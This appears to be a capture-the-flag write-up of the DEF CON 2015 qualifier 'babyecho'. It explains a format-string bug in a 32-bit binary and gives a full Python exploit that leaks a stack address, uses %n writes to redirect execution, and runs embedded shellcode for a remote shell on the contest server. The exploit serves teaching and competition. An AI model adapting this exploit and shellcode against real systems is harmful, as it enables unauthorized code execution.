---
layout: post
title: "DefConCTF 2015 Quals - babyecho Writeup"
date: 2015-05-18 21:45:44 +0430
comments: true
categories: defcon pwn fmt
---

**DefConCTF 2015 babycho Writeup**  
**Point = 1**  
**Category = Pwnable**  

> babyecho_eb11fdf6e40236b1a37b7974c53b6c3d

```
$ file babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
babyecho_eb11fdf6e40236b1a37b7974c53b6c3d: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=c9a66685159ad72bd157b521f05a85e2e427f5ee, stripped
$ checksec.sh --file babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
```

First try got my attention:

```
$ ./babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
Reading 13 bytes
%p%p%p%p
0xd0xa(nil)0xd
Reading 13 bytes
```

There is format string vulnerability, and based on binary properties we should run our shellcode.

<!--more-->

but there's a limit, 13 bytes? right?

time to take a look at binary in IDA, the main function is `sub_8048F3C`.
some resolving symbols the function looks like this:

```
int sub_8048F3C()
{
  signed int v0; // eax@2
  int v3; // [sp+10h] [bp-410h]@1
  int v4; // [sp+1Ch] [bp-404h]@4
  int v5; // [sp+41Ch] [bp-4h]@1

  v5 = *MK_FP(__GS__, 20);
  v3 = 13;
  setvbuf((int)off_80EA4C0, 0, 2, 0);
  signal(14, (int)sub_8048EB1);
  alarm(10);
  while ( 1 )
  {
    v0 = 1023;
    if ( v3 <= 1023 )
      v0 = v3;
    v3 = v0;
    printf("Reading %d bytes\n", v0);
    reado((int)&v4, v3, 10);
    filter_n((int)&v4);
    printf((const char *)&v4);
    alarm(10);
  }
}
```

the `filter_n` function just checks for `%n` and filters it as `_n`.

if i overwrite `v0` i can send my shellcode and return to it.

i just need to know the offset, and gdb says it is 7:

```
Reading 13 bytes
%p%p%p%p
[-------------------------------------registers--------------------------------------]
EAX: 0xffffc86c ("%p%p%p%p")
EBX: 0x80481a8 (push   ebx)
ECX: 0x0 
EDX: 0xffffffff 
ESI: 0x0 
EDI: 0x80ea00c --> 0x80660a0 (mov    edx,DWORD PTR [esp+0x4])
EBP: 0xffffcc78 --> 0x80497d0 (push   ebx)
ESP: 0xffffc850 --> 0xffffc86c ("%p%p%p%p")
EIP: 0x804900f (call   0x804f560)
[----------------------------------------code----------------------------------------]
   0x8049003:   call   0x8048ecf
   0x8049008:   lea    eax,[esp+0x1c]
   0x804900c:   mov    DWORD PTR [esp],eax
=> 0x804900f:   call   0x804f560
   0x8049014:   mov    DWORD PTR [esp],0xa
   0x804901b:   call   0x804fde0
   0x8049020:   mov    DWORD PTR [esp],0x14
   0x8049027:   call   0x806cb50
Guessed arguments:
arg[0]: 0xffffc86c ("%p%p%p%p")
[---------------------------------------stack----------------------------------------]
00:0000| esp 0xffffc850 --> 0xffffc86c ("%p%p%p%p")
01:0004|     0xffffc854 --> 0xd (b'\r')
02:0008|     0xffffc858 --> 0xa (b'\n')
03:0012|     0xffffc85c --> 0x0 
04:0016|     0xffffc860 --> 0xd (b'\r')
05:0020|     0xffffc864 --> 0xffffc86c ("%p%p%p%p")
06:0024|     0xffffc868 --> 0x0 
07:0028| eax 0xffffc86c ("%p%p%p%p")
[------------------------------------------------------------------------------------]
Legend: stack, code, data, heap, rodata, value

Breakpoint 2, 0x0804900f in ?? ()
```

Obviously, first i should leak the stack address at offset 5, then overwrite the `v0` so i send my shellcode, but the main part is how to break the loop. for this i just overwrite return address of `printf` and then jump to my shellcode.

TL;DR
Please check my implementation:

```
#!/usr/bin/python

import socket
import struct
import telnetlib

def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        c = f.read(1)
        assert len(c) > 0
        data += c
    #print data
    return data

def p(v):
    return struct.pack('<I', v)

def u(v):
    return struct.unpack('<I', v)[0]


#s = socket.create_connection(("127.0.0.1", 1337))
s = socket.create_connection(("babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me", 3232))
f = s.makefile('rw', bufsize=0)

raw_input("$") # attach debugger


shellcode = (
"\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2"
          "\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69"
                  "\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81"
        )

readuntil(f)
f.write("%p"*5+"\n")
loc =  int(readuntil(f)[:-1].split("0x")[-1], 16)  - 0x0c

readuntil(f)
f.write(p(loc)+"%30u%7$n\n")



readuntil(f)
f.write(p(loc)+"%1200u%7$n\n")

readuntil(f)

wrl = loc+100 & 0xffff
wrh = (loc+100 >> 16 ) & 0xffff

print hex(wrl), hex(wrh)

payload = p(loc-0x14)+"%0{i}c".format(i=wrl)+"%0007$hn"+"%0{i}c".format(i=(wrh-wrl-8))+p(loc-0x12)+"%0014$hn"+p(loc-0x12)+"A"*48+shellcode+"A"*(1024 - 48 - len(shellcode))+"\n"
print payload


f.write(payload)

print "[+] shell is ready: "
t = telnetlib.Telnet()
t.sock = s
t.interact()
```

there you go:

```
$ python babyecho-expl.py
0x4a24 0xffd2
�I��%018980c%0007$hn%046502c
[...]
cat /home/babyecho/flag 
The flag is: 1s 1s th3r3 th3r3 @n @n 3ch0 3ch0 1n 1n h3r3 h3r3? 3uoiw!T0*%
``` 

@HAMIDx9
